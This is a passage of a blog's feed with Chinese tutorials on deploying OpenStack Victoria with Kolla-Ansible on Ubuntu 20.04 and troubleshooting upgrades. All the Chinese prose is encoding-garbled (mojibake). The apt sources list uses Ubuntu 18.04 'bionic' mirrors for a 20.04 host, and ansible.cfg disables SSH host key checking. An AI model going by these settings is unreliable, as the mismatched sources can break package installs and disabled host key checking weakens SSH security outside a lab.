href="https://docs.openstack.org/kolla-ansible/latest/user/operating-kolla.html">Operating Kolla</a></li></ul><h2 id="æ•°æ®åº“è¿ç§»å‡ºé”™"><a href="#æ•°æ®åº“è¿ç§»å‡ºé”™" class="headerlink" title="æ•°æ®åº“è¿ç§»å‡ºé”™"></a>æ•°æ®åº“è¿ç§»å‡ºé”™</h2><p>å°è¯•å¤šæ¬¡æ— æœï¼Œå›é€€å¿«ç…§åæ‰§è¡Œ <code>kolla-ansible upgrade</code> æ²¡æœ‰é‡åˆ°è¯¥é—®é¢˜ï¼Œæ¸…é™¤åé‡æ–°éƒ¨ç½²åº”è¯¥ä¹Ÿå¯ä»¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR keystone migrate.exceptions.InvalidRepositoryError: &#x2F;var&#x2F;lib&#x2F;kolla&#x2F;venv&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;keystone&#x2F;common&#x2F;sql&#x2F;migrate_repo</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/06/15/AC5EoBvLWgfnIml.jpg"><h2 id="è¯·æ±‚è¶…æ—¶"><a href="#è¯·æ±‚è¶…æ—¶" class="headerlink" title="è¯·æ±‚è¶…æ—¶"></a>è¯·æ±‚è¶…æ—¶</h2><p>å†æ¬¡æ‰§è¡Œ <code>kolla-ansible upgrade</code> æ²¡æœ‰å†é‡åˆ°è¯¥é—®é¢˜ã€‚å®éªŒè¿‡ç¨‹ä¸­å‘ç°æ—¶ä¸æ—¶å°±ä¼šè¯·æ±‚è¶…æ—¶ï¼Œé€šå¸¸å°±é‡å¤æ‰§è¡ŒæŒ‡ä»¤ï¼Œå†ä¸è¡Œå°±æ¸…é™¤åé‡æ–°éƒ¨ç½²ã€‚</p><img src="https://i.loli.net/2021/06/15/LZuw58IqzsJQ6cA.jpg"><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/multinode.html">Multinode Deployment of Kolla - Option 1: local registry</a></li><li><a href="https://docs.docker.com/registry/">Docker Registry</a></li><li><a href="https://askubuntu.com/questions/420981/how-do-i-save-terminal-output-to-a-file">How do I save terminal output to a file?</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/operating-kolla.html">Operating Kolla</a></li><li><a href="https://docs.openstack.org/kolla/ussuri/admin/image-building.html">Building Container Images</a></li></ul>]]></content>
    
    
    <summary type="html">Ubuntu 20.04 + OpenStack (Victoria)</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack å•æœºéƒ¨ç½² â€”â€” Kolla-Ansible</title>
    <link href="https://jckling.github.io/2021/05/31/OpenStack/OpenStack%20%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%20%E2%80%94%E2%80%94%20Kolla-Ansible/"/>
    <id>https://jckling.github.io/2021/05/31/OpenStack/OpenStack%20%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%20%E2%80%94%E2%80%94%20Kolla-Ansible/</id>
    <published>2021-05-31T11:02:50.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><p>Kolla-Ansible åªæ”¯æŒåˆ—è¡¨ <a href="https://docs.openstack.org/kolla-ansible/latest/user/support-matrix">Supported Operating Systems</a> ä¸­çš„æ“ä½œç³»ç»Ÿï¼Œè¿™é‡Œé€‰ç”¨ Ubuntu 20.04 ã€‚</p><p>ä¸»æœºé…ç½®</p><ul><li>CPUï¼š4 Cores</li><li>å†…å­˜ï¼š16 GB</li><li>ç¡¬ç›˜ï¼š512 GB</li><li>ç½‘å¡ï¼š<ul><li>NAT-Network</li><li>æœªæŒ‡å®š</li></ul></li></ul><h2 id="æ›´æ¢-pip-æºï¼ˆå¯é€‰ï¼‰"><a href="#æ›´æ¢-pip-æºï¼ˆå¯é€‰ï¼‰" class="headerlink" title="æ›´æ¢ pip æºï¼ˆå¯é€‰ï¼‰"></a>æ›´æ¢ pip æºï¼ˆå¯é€‰ï¼‰</h2><p>åœ¨ç”¨æˆ·æ ¹ç›®å½•åˆ›å»ºæ–‡ä»¶å¤¹ <code>.pip</code> ï¼Œæ·»åŠ é…ç½®æ–‡ä»¶ <code>pip.conf</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">cd</span> &amp;&amp; mkdir .pip &amp;&amp; <span class="built_in">cd</span> .pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¹¶ç¼–è¾‘é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vim pip.conf</span><br></pre></td></tr></table></figure><p>pip æºé…ç½®å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 6000</span><br><span class="line">index-url &#x3D; http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">trusted-host &#x3D; mirrors.aliyun.com</span><br></pre></td></tr></table></figure><h2 id="æ›´æ¢-Ubuntu-æºï¼ˆå¯é€‰ï¼‰"><a href="#æ›´æ¢-Ubuntu-æºï¼ˆå¯é€‰ï¼‰" class="headerlink" title="æ›´æ¢ Ubuntu æºï¼ˆå¯é€‰ï¼‰"></a>æ›´æ¢ Ubuntu æºï¼ˆå¯é€‰ï¼‰</h2><p>å¤‡ä»½æºæ–‡ä»¶ï¼Œå†æ›¿æ¢æˆæ¸…åçš„é•œåƒæº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤‡ä»½</span></span><br><span class="line">sudo mv /etc/apt/sources.list /etc/apt/sources.list.bk</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®é•œåƒæº</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°æº</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡çº§</span></span><br><span class="line">sudo apt dist-upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>é•œåƒæºè®¾ç½®å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line"># deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line"># deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line"># deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line"># deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ–°æº</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Python æ„å»ºä¾èµ–</span></span><br><span class="line">sudo apt install python3-dev libffi-dev gcc libssl-dev -y</span><br></pre></td></tr></table></figure><p>å®‰è£… <code>venv</code>ï¼Œåˆ›å»ºå¹¶ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… venv</span></span><br><span class="line">sudo apt install python3-venv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">mkdir code</span><br><span class="line">python -m venv /home/jck/code</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> /home/jck/code/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Ansible</span></span><br><span class="line">pip install -U pip</span><br><span class="line">pip install <span class="string">&#x27;ansible&lt;3.0&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="éƒ¨ç½²-OpenStack"><a href="#éƒ¨ç½²-OpenStack" class="headerlink" title="éƒ¨ç½² OpenStack"></a>éƒ¨ç½² OpenStack</h1><h2 id="å®‰è£…-Kolla-Ansible"><a href="#å®‰è£…-Kolla-Ansible" class="headerlink" title="å®‰è£… Kolla-Ansible"></a>å®‰è£… Kolla-Ansible</h2><p>ä½¿ç”¨ git å…‹éš†ä»“åº“ï¼Œ<code>-b</code> å‚æ•°æŒ‡å®šç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/kolla -b stable/victoria</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/kolla-ansible -b stable/victoria</span><br></pre></td></tr></table></figure><p>åœ¨è™šæ‹Ÿç¯å¢ƒä¸­å®‰è£…ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line">pip install ./kolla</span><br><span class="line">pip install ./kolla-ansible</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç›®å½•</span></span><br><span class="line">sudo mkdir -p /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># æƒé™è®¾ç½®</span></span><br><span class="line">sudo chown <span class="variable">$USER</span>:<span class="variable">$USER</span> /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">cp -r kolla-ansible/etc/kolla/* /etc/kolla</span><br><span class="line">cp kolla-ansible/ansible/inventory/* .</span><br></pre></td></tr></table></figure><h2 id="é…ç½®-Ansible"><a href="#é…ç½®-Ansible" class="headerlink" title="é…ç½® Ansible"></a>é…ç½® Ansible</h2><p>åˆ›å»ºå¹¶ç¼–è¾‘ Ansible é…ç½®æ–‡ä»¶ ansible.cfg</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»º</span></span><br><span class="line">sudo touch /etc/ansible/ansible.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–è¾‘</span></span><br><span class="line">sudo vim /etc/ansible/ansible.cfg</span><br></pre></td></tr></table></figure><p>æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">host_key_checking&#x3D;False</span><br><span class="line">pipelining&#x3D;True</span><br><span class="line">forks&#x3D;100</span><br></pre></td></tr></table></figure><h2 id="å‡†å¤‡åˆå§‹é…ç½®"><a href="#å‡†å¤‡åˆå§‹é…ç½®" class="headerlink" title="å‡†å¤‡åˆå§‹é…ç½®"></a>å‡†å¤‡åˆå§‹é…ç½®</h2><h3 id="Inventory"><a href="#Inventory" class="headerlink" title="Inventory"></a>Inventory</h3><p>ä¸¤ä¸ªç¤ºä¾‹æ–‡ä»¶ï¼šall-in-one å’Œ multinodeï¼Œå•æœºéƒ¨ç½²ä¸éœ€è¦åšé¢å¤–çš„ä¿®æ”¹ã€‚</p><h3 id="Kolla-å¯†ç "><a href="#Kolla-å¯†ç " class="headerlink" title="Kolla å¯†ç "></a>Kolla å¯†ç </h3><p>éƒ¨ç½²è¿‡ç¨‹ä¸­ä½¿ç”¨çš„å¯†ç å­˜å‚¨åœ¨ <code>/etc/kolla/passwords.yml</code> æ–‡ä»¶ï¼Œåˆå§‹ä¸ºç©ºç™½ï¼Œéœ€è¦æ‰‹åŠ¨è®¾ç½®æˆ–éšæœºç”Ÿæˆã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> kolla-ansible/tools</span><br><span class="line">./generate_passwords.py</span><br></pre></td></tr></table></figure><h3 id="Kolla-globals-yml"><a href="#Kolla-globals-yml" class="headerlink" title="Kolla globals.yml"></a>Kolla globals.yml</h3><p><code>globals.yml</code> æ˜¯ Kolla-Ansible çš„ä¸»è¦é…ç½®æ–‡ä»¶ï¼Œä»¥ä¸‹é€‰é¡¹éœ€è¦è¿›è¡Œé…ç½®ï¼š</p><ul><li>Image optionsï¼šæŒ‡å®šç”¨äºéƒ¨ç½²çš„é•œåƒï¼Œæ”¯æŒ <code>centos</code>ã€<code>ubuntu</code>ã€<code>debian</code>ã€<code>rhel</code><ul><li>typeï¼šåªå½±å“ OpenStack æœåŠ¡<ul><li><code>binary</code>ï¼šä½¿ç”¨å­˜å‚¨ä»“åº“ï¼Œä¾‹å¦‚ apt æˆ– dnfï¼›åŸºç¡€è®¾æ–½æœåŠ¡é€šå¸¸ä½¿ç”¨è¿™ä¸ªé€‰é¡¹</li><li><code>source</code>ï¼šä½¿ç”¨åŸå§‹æºå­˜æ¡£ï¼Œä¾‹å¦‚ git ä»“åº“æˆ–æœ¬åœ°æºç›®å½•ï¼›æ¯” <code>binary</code> ç¨å¾®å¯é äº›</li></ul></li></ul></li><li>Networkingï¼šç½‘ç»œé…ç½®<ul><li><code>network_interface</code>ï¼šç®¡ç†ç½‘ç»œ</li><li><code>external_interface</code>ï¼šNeutron å¤–éƒ¨ç½‘ç»œï¼Œæ²¡æœ‰ ip çš„ç½‘å¡</li><li><code>internal_vip_address</code>ï¼šæµ®åŠ¨ IP èŒƒå›´ï¼Œä¸ç®¡ç†ç½‘ç»œåŒç½‘æ®µ</li></ul></li><li>Enable additional servicesï¼šå®‰è£…é¢å¤–çš„æœåŠ¡ç»„ä»¶<ul><li>ä¾‹å¦‚ï¼Œ<code>enable_cinder: &quot;yes&quot;</code> è¡¨ç¤ºå¯ç”¨å—å­˜å‚¨æœåŠ¡ï¼Œæ”¯æŒçš„æœåŠ¡å‚è§ <a href="https://github.com/openstack/kolla-ansible/blob/master/README.rst#openstack-services">a list of available services</a></li></ul></li><li>Multiple globals filesï¼šä½¿ç”¨é¢å¤–çš„é…ç½®æ–‡ä»¶å¯ç”¨æœåŠ¡ï¼Œåœ¨ <code>etc/kolla/globals.d</code> ç›®å½•ä¸‹åˆ›å»º</li><li>Virtual environmentï¼šå»ºè®®åœ¨è¿œç¨‹ä¸»æœºä¸Šä½¿ç”¨è™šæ‹Ÿç¯å¢ƒæ‰§è¡Œ</li></ul><p>ç¼–è¾‘é…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/kolla/globals.yml</span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ“ä½œç³»ç»Ÿ</span></span><br><span class="line"><span class="attr">kolla_base_distro:</span> <span class="string">&quot;ubuntu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…æ–¹å¼</span></span><br><span class="line"><span class="attr">kolla_install_type:</span> <span class="string">&quot;source&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘ç»œ</span></span><br><span class="line"><span class="attr">kolla_internal_vip_address:</span> <span class="string">&quot;10.1.0.250&quot;</span> <span class="comment"># network_interface åŒç½‘æ®µ</span></span><br><span class="line"></span><br><span class="line"><span class="attr">network_interface:</span> <span class="string">&quot;ens192&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">neutron_external_interface:</span> <span class="string">&quot;ens160&quot;</span> <span class="comment"># ç©ºé—²ç½‘å¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#enable_cinder: &quot;yes&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#enable_cinder_backend_nfs: &quot;yes&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—</span></span><br><span class="line"><span class="attr">nova_compute_virt_type:</span> <span class="string">&quot;qemu&quot;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸æ”¯æŒè™šæ‹ŸåŒ–ï¼Œæ‰€ä»¥é…ç½®ä¸º <code>qemu</code> <del>ï¼Œéœ€è¦é¢å¤–å®‰è£… libvirt</del>ï¼ˆåº”è¯¥ä¸ç”¨è£…ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… libvirt</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-kvm libvirt-daemon-system -y</span><br></pre></td></tr></table></figure><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><p>é…ç½®æ–‡ä»¶å‡†å¤‡å®Œæ¯•åå³å¯è¿›è¡Œéƒ¨ç½²ï¼Œé¦–å…ˆè¿›è¡ŒåŸºç¡€çš„ä¸»æœºçº§ä¾èµ–è®¾ç½®ï¼ŒKolla-Ansible æä¾›äº†ä¸€ä¸ªå®‰è£…æ‰€æœ‰å¿…éœ€æœåŠ¡çš„ playbook</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ ¹æ® Kolla éƒ¨ç½²ä¾èµ–åˆ›å»ºæœåŠ¡å™¨</span></span><br><span class="line">kolla-ansible -i all-in-one bootstrap-servers</span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²å‰æ£€æŸ¥ä¸»æœº</span></span><br><span class="line">kolla-ansible -i all-in-one prechecks</span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½² OpenStack</span></span><br><span class="line">kolla-ansible -i all-in-one deploy</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-OpenStack"><a href="#ä½¿ç”¨-OpenStack" class="headerlink" title="ä½¿ç”¨ OpenStack"></a>ä½¿ç”¨ OpenStack</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… OpenStack CLI å®¢æˆ·ç«¯</span></span><br><span class="line">pip install python-openstackclient</span><br></pre></td></tr></table></figure><p>OpenStack éœ€è¦ openrc æ–‡ä»¶ï¼Œå…¶ä¸­è®¾ç½®äº† admin ç”¨æˆ·çš„å‡­æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆ openrc æ–‡ä»¶</span></span><br><span class="line">kolla-ansible post-deploy</span><br><span class="line">. /etc/kolla/admin-openrc.sh</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œè„šæœ¬ç”Ÿæˆç¤ºä¾‹ç½‘ç»œã€é•œåƒã€å®ä¾‹ç­‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code/share/kolla-ansible/init-runonce</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®ä¾‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pip install python-openstackclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå®ä¾‹</span></span><br><span class="line">openstack server create \</span><br><span class="line">    --image cirros \</span><br><span class="line">    --flavor m1.tiny \</span><br><span class="line">    --network demo-net \</span><br><span class="line">    demo1</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¡®è®¤å®ä¾‹çŠ¶æ€</span></span><br><span class="line">openstack server list</span><br></pre></td></tr></table></figure><p>è®¿é—® ip åœ°å€å¯è¿›å…¥ horizon ç™»å½•ç•Œé¢</p><ul><li>ç”¨æˆ·åï¼š<code>admin</code></li><li>å¯†ç ï¼šæŸ¥çœ‹ <code>/etc/kolla/passwords.yml</code></li></ul><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/support-matrix.html">Support Matrix</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/quickstart.html">OpenStack Docs: Quick Start</a></li></ul>]]></content>
    
    
    <summary type="html">Ubuntu 20.04 + OpenStack (Victoria)</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 20.04 è®¡ç®—èŠ‚ç‚¹æºç å®‰è£… nova-compute (Victoria)</title>
    <link href="https://jckling.github.io/2021/05/31/OpenStack/Ubuntu20.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20nova-compute%20(Victoria)/"/>
    <id>https://jckling.github.io/2021/05/31/OpenStack/Ubuntu20.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20nova-compute%20(Victoria)/</id>
    <published>2021-05-31T07:52:19.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h1><p>ç”±äºå®‰è£…çš„æ˜¯ Victoria ç‰ˆæœ¬ï¼Œè®¡ç®—èŠ‚ç‚¹è¦ä½¿ç”¨ Ubuntu 20.04 ã€‚</p><p>Ubuntu 18.04 æ§åˆ¶èŠ‚ç‚¹</p><ul><li>2 å¤„ç†å™¨</li><li>4 GB å†…å­˜</li><li>100 GB ç¡¬ç›˜</li></ul><p>Ubuntu 20.04 è®¡ç®—èŠ‚ç‚¹</p><ul><li>2 å¤„ç†å™¨</li><li>4 GB å†…å­˜</li><li>100 GB ç¡¬ç›˜</li></ul><p>å„ä½¿ç”¨ä¸¤å—ç½‘å¡</p><ul><li>NAT Network è™šæ‹Ÿæœºç»„ç½‘</li><li>Host-Only å®¿ä¸»æœº ssh è¿æ¥</li></ul><img src="https://i.loli.net/2021/06/06/8n3hsxDb4LKXOdf.png" width="60%"/><p>ä¿®æ”¹ä¸»æœºåç§°ï¼Œæ§åˆ¶èŠ‚ç‚¹ <code>controller</code>ã€è®¡ç®—èŠ‚ç‚¹ <code>compute</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hostnamectl set-hostname controller</span><br></pre></td></tr></table></figure><p>é…ç½®é™æ€ ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/netplan/00-installer-config.yaml</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This is the network config written by &#x27;subiquity&#x27;</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">enp0s3:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="number">10.0</span><span class="number">.2</span><span class="number">.28</span><span class="string">/24</span>]</span><br><span class="line">      <span class="attr">gateway4:</span> <span class="number">10.0</span><span class="number">.2</span><span class="number">.1</span></span><br><span class="line">      <span class="attr">nameservers:</span></span><br><span class="line">        <span class="attr">addresses:</span> [<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>]</span><br><span class="line">    <span class="attr">enp0s8:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="number">192.168</span><span class="number">.56</span><span class="number">.115</span><span class="string">/24</span>]</span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">to:</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span><span class="string">/24</span></span><br><span class="line">        <span class="attr">via:</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span></span><br><span class="line">        <span class="attr">metric:</span> <span class="number">100</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ hosts æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim 